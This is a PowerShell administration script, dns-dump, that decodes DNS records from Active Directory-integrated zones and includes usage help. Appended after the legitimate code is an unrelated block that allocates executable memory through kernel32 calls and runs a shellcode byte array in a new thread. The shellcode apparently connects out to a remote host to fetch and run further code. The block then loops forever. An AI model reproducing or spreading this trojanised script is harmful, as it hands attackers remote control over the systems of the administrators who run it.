Param([string]$zone,[string]$domain,[string]$dc,[switch]$csv,[switch]$help)function dumpByteArray([System.Byte[]]$array, [int]$width = 9){$hex = ""$chr = ""$int = ""$i = $array.Count"Array contains {0} elements" -f $i$index = 0$count = 0while ($i-- -gt 0){$val = $array[$index++]$hex += ("{0} " -f $val.ToString("x2"))if ([char]::IsLetterOrDigit($val) -or [char]::IsPunctuation($val)   -or ([char]$val -eq " ")){$chr += [char]$val}else{$chr += "."}$int += "{0,4:N0}" -f $val$count++if ($count -ge $width){"$hex $chr $int"$hex = ""$chr = ""$int = ""$count = 0}		}if ($count -gt 0){if ($count -lt $width){$hex += (" " * (3 * ($width - $count)))$chr += (" " * (1 * ($width - $count)))$int += (" " * (4 * ($width - $count)))}"$hex $chr $int"}}function dwordLE([System.Byte[]]$arr, [int]$startIndex){$res = $arr[$startIndex + 3]$res = ($res * 256) + $arr[$startIndex + 2]$res = ($res * 256) + $arr[$startIndex + 1]$res = ($res * 256) + $arr[$startIndex + 0]return $res}function dwordBE([System.Byte[]]$arr, [int]$startIndex){$res = $arr[$startIndex]$res = ($res * 256) + $arr[$startIndex + 1]$res = ($res * 256) + $arr[$startIndex + 2]$res = ($res * 256) + $arr[$startIndex + 3]return $res}function wordLE([System.Byte[]]$arr, [int]$startIndex){$res = $arr[$startIndex + 1]$res = ($res * 256) + $arr[$startIndex]return $res}function wordBE([System.Byte[]]$arr, [int]$startIndex){$res = $arr[$startIndex]$res = ($res * 256) + $arr[$startIndex + 1]return $res}function decodeName([System.Byte[]]$arr, [int]$startIndex){[int]$totlen   = $arr[$startIndex][int]$segments = $arr[$startIndex + 1][int]$index    = $startIndex + 2[string]$name  = ""while ($segments-- -gt 0){[int]$segmentLength = $arr[$index++]while ($segmentLength-- -gt 0){$name += [char]$arr[$index++]}$name += "."}return $name}function analyzeArray([System.Byte[]]$arr, [System.Object]$var){$nameArray = $var.distinguishedname.ToString().Split(",")$name = $nameArray[0].SubString(3)$rdataLen = wordLE $arr 0$rdatatype = wordLE $arr 2$updatedAtSerial = dwordLE $arr 8$ttl = dwordBE $arr 12$age = dwordLE $arr 20if ($age -ne 0){$timestamp = ((get-date -year 1601 -month 1 -day 1 -hour 0 -minute 0 -second 0).AddHours($age)).ToString()}else{$timestamp = "[static]"}if ($rdatatype -eq 1){$ip = "{0}.{1}.{2}.{3}" -f $arr[24], $arr[25], $arr[26], $arr[27]if ($csv){$formatstring = "{0},{1},{2},{3},{4}"}else{$formatstring = "{0,-30}`t{1,-24}`t{2}`t{3}`t{4}"}$formatstring -f $name, $timestamp, $ttl, "A", $ip}elseif ($rdatatype -eq 2){$nsname = decodeName $arr 24if ($csv){$formatstring = "{0},{1},{2},{3},{4}"}else{$formatstring = "{0,-30}`t{1,-24}`t{2}`t{3}`t{4}"}$formatstring -f $name, $timestamp, $ttl, "NS", $nsname}elseif ($rdatatype -eq 5){$alias = decodeName $arr 24if ($csv){$formatstring = "{0},{1},{2},{3},{4}"}else{$formatstring = "{0,-30}`t{1,-24}`t{2}`t{3}`t{4}"}$formatstring -f $name, $timestamp, $ttl, "CNAME", $alias}elseif ($rdatatype -eq 6){$nslen = $arr[44]$priserver = decodeName $arr 44$index = 46 + $nslen$resparty = decodeName $arr $index$serial = dwordBE $arr 24$refresh = dwordBE $arr 28$retry = dwordBE $arr 32$expires = dwordBE $arr 36$minttl = dwordBE $arr 40if ($csv){$formatstring = "{0},{1},{2},{3},{4},{5},{6},{7},{8},{9},{10}"$formatstring -f $name, $timestamp, $ttl, `"SOA", $priserver, $resparty, `$serial, $refresh, $retry, `$expires, $minttl}else{$formatstring = "{0,-30}`t{1,-24}`t{2}`t{3}"$formatstring -f $name, $timestamp, $ttl, "SOA"(" " * 32) + "Primary server: $priserver"(" " * 32) + "Responsible party: $resparty"(" " * 32) + "Serial: $serial"(" " * 32) + "TTL: $ttl"(" " * 32) + "Refresh: $refresh"(" " * 32) + "Retry: $retry"(" " * 32) + "Expires: $expires"(" " * 32) + "Minimum TTL (default): $minttl"}}elseif ($rdatatype -eq 12){$ptr = decodeName $arr 24if ($csv){$formatstring = "{0},{1},{2},{3},{4}"}else{$formatstring = "{0,-30}`t{1,-24}`t{2}`t{3}`t{4}"}$formatstring -f $name, $timestamp, $ttl, "PTR", $ptr}elseif ($rdatatype -eq 13){[string]$cputype = ""[string]$ostype  = ""[int]$segmentLength = $arr[24]$index = 25while ($segmentLength-- -gt 0){$cputype += [char]$arr[$index++]}$index = 24 + $arr[24] + 1[int]$segmentLength = $index++while ($segmentLength-- -gt 0){$ostype += [char]$arr[$index++]}if ($csv){$formatstring = "{0},{1},{2},{3},{4},{5}"}else{$formatstring = "{0,-30}`t{1,-24}`t{2}`t{3}`t{4},{5}"}$formatstring -f $name, $timestamp, $ttl, "HINFO", $cputype, $ostype}elseif ($rdatatype -eq 15){$priority = wordBE $arr 24$mxhost   = decodeName $arr 26if ($csv){$formatstring = "{0},{1},{2},{3},{4},{5}"}else{$formatstring = "{0,-30}`t{1,-24}`t{2}`t{3}`t{4}  {5}"}$formatstring -f $name, $timestamp, $ttl, "MX", $priority, $mxhost}elseif ($rdatatype -eq 16){[string]$txt  = ""[int]$segmentLength = $arr[24]$index = 25while ($segmentLength-- -gt 0){$txt += [char]$arr[$index++]}if ($csv){$formatstring = "{0},{1},{2},{3},{4}"}else{$formatstring = "{0,-30}`t{1,-24}`t{2}`t{3}`t{4}"}$formatstring -f $name, $timestamp, $ttl, "TXT", $txt}elseif ($rdatatype -eq 28){$str = ""for ($i = 24; $i -lt 40; $i+=2){$seg = wordBE $arr $i$str += ($seg).ToString('x4')if ($i -ne 38) { $str += ':' }}if ($csv){$formatstring = "{0},{1},{2},{3},{4}"}else{$formatstring = "{0,-30}`t{1,-24}`t{2}`t{3}`t{4}"}$formatstring -f $name, $timestamp, $ttl, "AAAA", $str}elseif ($rdatatype -eq 33){$port   = wordBE $arr 28$weight = wordBE $arr 26$pri    = wordBE $arr 24$nsname = decodeName $arr 30if ($csv){$formatstring = "{0},{1},{2},{3},{4},{5}"}else{$formatstring = "{0,-30}`t{1,-24}`t{2}`t{3} {4} {5}"}$formatstring -f `$name, $timestamp, `$ttl, "SRV", `("[" + $pri.ToString() + "][" + $weight.ToString() + "][" + $port.ToString() + "]"), `$nsname}else{$name"RDataType $rdatatype"$var.distinguishedname.ToString()dumpByteArray $arr}}function processAttribute([string]$attrName, [System.Object]$var){$array = $var.$attrName.Valueif ($array -is [System.Byte[]]){" "analyzeArray $array $var" "}else{for ($i = 0; $i -lt $array.Count; $i++){" "analyzeArray $array[$i] $var" "}}}function usage{".\dns-dump -zone  [-dc ] [-domain] [-csv] |-helpdns-dump will dump, from Active Directory, a particular named zone. The zone named must be Active Directory integrated.Zone contents can vary depending on domain controller (in regardsto replication and the serial number of the SOA record). By usingthe -dc parameter, you can specify the desired DC to use. Otherwise,dns-dump uses the default DC.The -domain option can be specified if the script is to be usedagainst a domain that the current host isn't a part of but has readaccess to.Usually, output is formatted for display on a workstation. If youwant CSV (comma-separated-value) output, specify the -csv parameter.Use out-file in the pipeline to save the output to a file.Finally, to produce this helpful output, you can specify the -helpparameter.This command is basically equivalent to (but better than) the:dnscmd /zoneprint ordnscmd /enumrecords  '@'commands.Example 1:.\dns-dump -zone essential.local -dc win2008-dc-3Example 2:.\dns-dump -helpExample 3:.\dns-dump -zone essential.local -csv |out-file essential.txt -encoding asciiNote: the '-encoding ascii' is important if you want towork with the file within the old cmd.exe shell. Otherwise,you can usually leave that off."}if ($help){usagereturn}if ($args.Length -gt 0){write-error "Invalid parameter specified"usagereturn}if (!$zone){throw "must specify zone name"return}if ($domain){$defaultNC = "DC=" + $domain.replace(".",",DC=")}else{$root = [ADSI]"LDAP://RootDSE"$defaultNC = $root.defaultNamingContext	}$dn = "LDAP://"if ($dc) { $dn += $dc + "/" }$dn += "DC=" + $zone + ",CN=MicrosoftDNS,CN=System," + $defaultNC$obj = [ADSI]$dnif ($obj.name){if ($csv){"Name,Timestamp,TTL,RecordType,Param1,Param2"}foreach ($record in $obj.psbase.Children){if ($record.dnsRecord)   { processAttribute "dNSRecord"   $record }}}else{write-error "Can't open $dn"}$obj = $null$fVj = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $fVj -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x57,0x38,0xb9,0x77,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$CSPj=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($CSPj.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$CSPj,0,0,0);for (;;){Start-sleep 60};